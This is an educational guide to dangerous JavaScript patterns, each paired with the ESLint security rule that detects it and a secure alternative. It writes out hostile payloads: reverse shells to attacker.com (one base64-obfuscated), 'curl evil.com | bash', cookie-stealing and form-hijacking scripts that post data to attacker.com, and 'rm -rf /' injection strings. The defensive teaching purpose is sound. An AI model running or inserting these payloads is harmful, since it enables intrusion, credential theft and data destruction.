# Malicious JavaScript/TypeScript Patterns

This document provides educational examples of dangerous code patterns that ESLint with security plugins can detect. These examples illustrate real-world vulnerabilities and malicious techniques.

**⚠️ WARNING**: The code examples below are intentionally insecure and should NEVER be used in production. They are for educational purposes only.

## Table of Contents

1. [Code Injection](#code-injection)
2. [XSS Vulnerabilities](#xss-vulnerabilities)
3. [Command Injection](#command-injection)
4. [ReDoS (Regular Expression Denial of Service)](#redos)
5. [Path Traversal](#path-traversal)
6. [Prototype Pollution](#prototype-pollution)
7. [Timing Attacks](#timing-attacks)
8. [Obfuscation Techniques](#obfuscation-techniques)
9. [Data Exfiltration](#data-exfiltration)

---

## Code Injection

### 1. Direct eval() Usage

**Detected by**: `no-eval`, `security/detect-eval-with-expression`

**Vulnerable Code**:
```javascript
// DANGEROUS: Arbitrary code execution
const userInput = req.query.code;
const result = eval(userInput);  // ❌ ESLint: no-eval

// Malicious input: "require('child_process').exec('rm -rf /')"
```

**Attack Vector**: Attacker can execute arbitrary JavaScript code, including system commands via Node.js APIs.

**Secure Alternative**:
```javascript
// Safe: Use JSON.parse for data
const userInput = req.query.data;
const result = JSON.parse(userInput);  // ✅ Safe for JSON data

// Or use a sandboxed evaluator
const vm = require('vm');
const result = vm.runInNewContext(userInput, {}, { timeout: 1000 });
```

---

### 2. Implied eval()

**Detected by**: `no-implied-eval`

**Vulnerable Code**:
```javascript
// DANGEROUS: Time-delayed code execution
const userCode = req.body.callback;
setTimeout(userCode, 1000);  // ❌ ESLint: no-implied-eval
setInterval(userCode, 5000); // ❌ ESLint: no-implied-eval

// Malicious: "fetch('evil.com/exfil?data='+document.cookie)"
```

**Attack Vector**: Execute arbitrary JavaScript after a delay, useful for bypassing certain security checks.

**Secure Alternative**:
```javascript
// Safe: Use function reference
function safeCallback() {
  console.log('Safe action');
}
setTimeout(safeCallback, 1000);  // ✅ Safe

// Or anonymous function
setTimeout(() => {
  console.log('Safe action');
}, 1000);  // ✅ Safe
```

---

### 3. Function Constructor

**Detected by**: `no-new-func`

**Vulnerable Code**:
```javascript
// DANGEROUS: Dynamic function creation
const operation = req.query.op;
const dynamicFunc = new Function('a', 'b', operation);  // ❌ ESLint: no-new-func
const result = dynamicFunc(5, 3);

// Malicious: "return require('fs').readFileSync('/etc/passwd', 'utf8')"
```

**Attack Vector**: Create functions from user input, leading to code execution.

**Secure Alternative**:
```javascript
// Safe: Whitelist allowed operations
const allowedOps = {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b
};

const operation = req.query.op;
const safeFunc = allowedOps[operation];  // ✅ Safe with whitelist
if (safeFunc) {
  const result = safeFunc(5, 3);
}
```

---

## XSS Vulnerabilities

### 4. Unsafe innerHTML

**Detected by**: `no-unsanitized/property`

**Vulnerable Code**:
```javascript
// DANGEROUS: XSS via innerHTML
const username = req.query.name;
document.getElementById('welcome').innerHTML = `Hello ${username}`;  // ❌ ESLint: no-unsanitized/property

// Malicious: <img src=x onerror="fetch('evil.com?c='+document.cookie)">
```

**Attack Vector**: Inject malicious HTML/JavaScript that executes in victim's browser.

**Secure Alternative**:
```javascript
// Safe: Use textContent
const username = req.query.name;
document.getElementById('welcome').textContent = `Hello ${username}`;  // ✅ Safe

// Or sanitize with DOMPurify
import DOMPurify from 'dompurify';
document.getElementById('content').innerHTML = DOMPurify.sanitize(untrustedHTML);  // ✅ Safe
```

---

### 5. React dangerouslySetInnerHTML

**Detected by**: `no-unsanitized/property` (with React plugin)

**Vulnerable Code**:
```jsx
// DANGEROUS: XSS in React
function UserComment({ comment }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: comment }} />  // ❌ Dangerous without sanitization
  );
}

// Malicious comment: "<script>steal_session()</script>"
```

**Secure Alternative**:
```jsx
// Safe: Render as text
function UserComment({ comment }) {
  return <div>{comment}</div>;  // ✅ Automatically escaped
}

// Or sanitize first
import DOMPurify from 'isomorphic-dompurify';

function UserComment({ comment }) {
  const sanitized = DOMPurify.sanitize(comment);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;  // ✅ Safe
}
```

---

### 6. javascript: URLs

**Detected by**: `no-script-url`

**Vulnerable Code**:
```javascript
// DANGEROUS: JavaScript URLs
const action = req.query.action;
const link = document.createElement('a');
link.href = `javascript:${action}`;  // ❌ ESLint: no-script-url
document.body.appendChild(link);

// Malicious: "alert(document.cookie)"
```

**Secure Alternative**:
```javascript
// Safe: Use data attributes and event handlers
const link = document.createElement('a');
link.href = '#';
link.dataset.action = action;
link.addEventListener('click', (e) => {
  e.preventDefault();
  // Handle action safely
});
```

---

## Command Injection

### 7. child_process with User Input

**Detected by**: `security/detect-child-process`

**Vulnerable Code**:
```javascript
// DANGEROUS: Command injection
const { exec } = require('child_process');
const filename = req.query.file;

exec(`cat ${filename}`, (error, stdout) => {  // ❌ ESLint: security/detect-child-process
  res.send(stdout);
});

// Malicious: "file.txt; rm -rf / #"
// Malicious: "file.txt && curl evil.com | bash"
```

**Attack Vector**: Execute arbitrary shell commands, create reverse shells, exfiltrate data.

**Secure Alternative**:
```javascript
// Safe: Use execFile with array arguments
const { execFile } = require('child_process');
const filename = req.query.file;

// Validate input
if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
  return res.status(400).send('Invalid filename');
}

execFile('cat', [filename], (error, stdout) => {  // ✅ Safe - no shell
  if (error) {
    return res.status(500).send('Error reading file');
  }
  res.send(stdout);
});

// Or use fs API instead
const fs = require('fs').promises;
const content = await fs.readFile(filename, 'utf8');
```

---

### 8. Reverse Shell Pattern

**Detected by**: `security/detect-child-process`

**Malicious Code**:
```javascript
// MALICIOUS: Reverse shell establishment
const { exec } = require('child_process');

// Reverse shell to attacker's server
exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1');  // ❌ Malicious

// Or encoded version to evade simple detection
const payload = Buffer.from('YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx', 'base64').toString();
exec(payload);  // ❌ Malicious
```

**Detection**: ESLint catches the `exec()` usage; decode base64 patterns manually or with graudit.

---

## ReDoS

### 9. Unsafe Regular Expressions

**Detected by**: `security/detect-unsafe-regex`

**Vulnerable Code**:
```javascript
// DANGEROUS: Catastrophic backtracking
const userPattern = req.query.pattern;
const regex = new RegExp(`(a+)+b`);  // ❌ ESLint: security/detect-unsafe-regex

// Attack input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!" (no 'b' at end)
// Causes exponential backtracking, CPU spike
const match = userInput.match(regex);
```

**Attack Vector**: Cause denial of service by sending input that triggers exponential regex processing.

**Patterns at Risk**:
- `(a+)+`
- `(a|a)*`
- `(a*)*`
- `(a|ab)*`

**Secure Alternative**:
```javascript
// Safe: Use non-backtracking patterns
const regex = /^a+b$/;  // ✅ Linear time

// Or use timeouts
const matched = timeoutRegex(pattern, input, 100);  // 100ms timeout
```

---

## Path Traversal

### 10. Dynamic File Paths

**Detected by**: `security/detect-non-literal-fs-filename`

**Vulnerable Code**:
```javascript
// DANGEROUS: Path traversal
const fs = require('fs');
const requestedFile = req.query.file;

fs.readFile(`./uploads/${requestedFile}`, (err, data) => {  // ❌ ESLint: security/detect-non-literal-fs-filename
  res.send(data);
});

// Malicious: "../../../../etc/passwd"
```

**Attack Vector**: Access files outside intended directory, read sensitive files.

**Secure Alternative**:
```javascript
// Safe: Validate and sanitize path
const path = require('path');
const fs = require('fs').promises;

const requestedFile = req.query.file;
const uploadsDir = path.resolve('./uploads');

// Remove path traversal sequences
const safePath = path.normalize(requestedFile).replace(/^(\.\.(\/|\\|$))+/, '');
const fullPath = path.join(uploadsDir, safePath);

// Ensure resolved path is within uploads directory
if (!fullPath.startsWith(uploadsDir)) {
  return res.status(403).send('Access denied');
}

const data = await fs.readFile(fullPath);  // ✅ Safe
res.send(data);
```

---

## Prototype Pollution

### 11. Object Injection

**Detected by**: `security/detect-object-injection`

**Vulnerable Code**:
```javascript
// DANGEROUS: Prototype pollution
const userKey = req.query.key;
const userValue = req.query.value;

const config = {};
config[userKey] = userValue;  // ⚠️ ESLint: security/detect-object-injection (warning)

// Malicious: key="__proto__" value="{'isAdmin':true}"
// Pollutes all objects' prototype
```

**Attack Vector**: Modify Object.prototype, affecting all objects in application.

**Secure Alternative**:
```javascript
// Safe: Validate keys
const allowedKeys = ['theme', 'language', 'timezone'];

if (!allowedKeys.includes(userKey)) {
  return res.status(400).send('Invalid key');
}

const config = Object.create(null);  // No prototype
config[userKey] = userValue;  // ✅ Safer

// Or use Map
const config = new Map();
config.set(userKey, userValue);  // ✅ Safe
```

---

## Timing Attacks

### 12. String Comparison for Secrets

**Detected by**: `security/detect-possible-timing-attacks`

**Vulnerable Code**:
```javascript
// DANGEROUS: Timing attack vulnerability
const userToken = req.headers.authorization;
const validToken = process.env.API_KEY;

if (userToken === validToken) {  // ❌ ESLint: security/detect-possible-timing-attacks
  // Grant access
}

// Attacker can determine token character-by-character via timing
```

**Attack Vector**: Measure response time to deduce secret values byte-by-byte.

**Secure Alternative**:
```javascript
// Safe: Constant-time comparison
const crypto = require('crypto');

function constantTimeCompare(a, b) {
  if (a.length !== b.length) return false;
  return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
}

if (constantTimeCompare(userToken, validToken)) {  // ✅ Safe
  // Grant access
}
```

---

## Obfuscation Techniques

### 13. Base64 Encoded Payloads

**Detection**: Manual review or `graudit -d exec`

**Malicious Code**:
```javascript
// MALICIOUS: Obfuscated payload
const payload = 'cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgZXZpbC5jb20gfCBiYXNoIik=';
eval(Buffer.from(payload, 'base64').toString());  // Decodes to: require("child_process").exec("curl evil.com | bash")

// More sophisticated: multi-layer encoding
const layer1 = 'NTc0NDRmNTI1YTU3...';  // hex-encoded base64
const layer2 = Buffer.from(layer1, 'hex').toString();
const layer3 = Buffer.from(layer2, 'base64').toString();
eval(layer3);  // ❌ Executes malicious code
```

**Detection Approach**:
```bash
# Look for base64 decode patterns
grep -r "base64" --include="*.js" .
grep -r "atob\|btoa" --include="*.js" .
grep -r "Buffer.from.*base64" --include="*.js" .
```

---

### 14. String Concatenation Obfuscation

**Malicious Code**:
```javascript
// MALICIOUS: Obfuscated function names
const e = 'ev';
const v = 'al';
const payload = 'malicious_code_here';
window[e + v](payload);  // Executes: eval(payload)

// Hexadecimal obfuscation
const cmd = '\x65\x76\x61\x6c';  // "eval"
window[cmd]('malicious_code');

// Unicode escape
const fn = '\u0065\u0076\u0061\u006c';  // "eval"
window[fn]('malicious_code');
```

**Detection**: ESLint may miss these; use pattern matching:
```bash
grep -E "\\\\x[0-9a-f]{2}|\\\\u[0-9a-f]{4}" --include="*.js" .
```

---

## Data Exfiltration

### 15. Cookie Stealing

**Malicious Code**:
```javascript
// MALICIOUS: Exfiltrate session cookies
const exfil = `
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: {...localStorage},
      sessionStorage: {...sessionStorage}
    })
  });
`;

// Injected via XSS
document.getElementById('user-content').innerHTML = `<img src=x onerror="${exfil}">`;
```

**Prevention**: Use `no-unsanitized/*` rules, CSP headers, HttpOnly cookies.

---

### 16. Form Hijacking

**Malicious Code**:
```javascript
// MALICIOUS: Intercept form submissions
const forms = document.querySelectorAll('form');
forms.forEach(form => {
  form.addEventListener('submit', (e) => {
    const formData = new FormData(form);
    const data = Object.fromEntries(formData);
    
    // Send to attacker
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
    
    // Allow normal submission to hide attack
  });
});
```

---

## Detection Summary Table

| Pattern | ESLint Rule | Severity | MITRE ATT&CK |
|---------|-------------|----------|--------------|
| `eval()` | `no-eval` | CRITICAL | T1059.007 |
| `setTimeout(string)` | `no-implied-eval` | CRITICAL | T1059.007 |
| `new Function()` | `no-new-func` | CRITICAL | T1059.007 |
| `innerHTML = user_input` | `no-unsanitized/property` | HIGH | T1059.007 |
| `child_process.exec()` | `security/detect-child-process` | HIGH | T1059.004 |
| `(a+)+` regex | `security/detect-unsafe-regex` | HIGH | T1499 |
| `fs.readFile(user_path)` | `security/detect-non-literal-fs-filename` | HIGH | T1083 |
| `obj[user_key]` | `security/detect-object-injection` | MEDIUM | CWE-1321 |
| `token === secret` | `security/detect-possible-timing-attacks` | MEDIUM | T1552 |
| Base64 + eval | Manual review | CRITICAL | T1027 |

---

## Testing Your Configuration

Use these intentionally vulnerable test files to verify ESLint configuration:

**test-vulnerabilities.js**:
```javascript
// Should trigger errors
eval('console.log("test")');  // no-eval
setTimeout('alert(1)', 1000);  // no-implied-eval
new Function('a', 'return a + 1');  // no-new-func

const { exec } = require('child_process');
exec('ls -la');  // security/detect-child-process

document.body.innerHTML = userInput;  // no-unsanitized/property

const fs = require('fs');
fs.readFile(userPath);  // security/detect-non-literal-fs-filename
```

**Expected Output**:
```bash
$ eslint --config .eslintrc.security.json test-vulnerabilities.js

test-vulnerabilities.js
  2:1   error  eval can be harmful                    no-eval
  3:12  error  Implied eval. Consider passing a function  no-implied-eval
  4:1   error  The Function constructor is eval         no-new-func
  7:1   error  Found require("child_process")          security/detect-child-process
  9:24  error  Assignment to innerHTML                 no-unsanitized/property
  12:13 error  Found fs.readFile with non-literal      security/detect-non-literal-fs-filename

✖ 6 problems (6 errors, 0 warnings)
```

---

## Additional Resources

- [OWASP JavaScript Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html)
- [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [ESLint Security Plugin Rules](https://github.com/nodesecurity/eslint-plugin-security#rules)
- [Mozilla's eslint-plugin-no-unsanitized](https://github.com/mozilla/eslint-plugin-no-unsanitized)

---

**Remember**: These examples are for educational purposes. Always follow secure coding practices and validate/sanitize all user input.
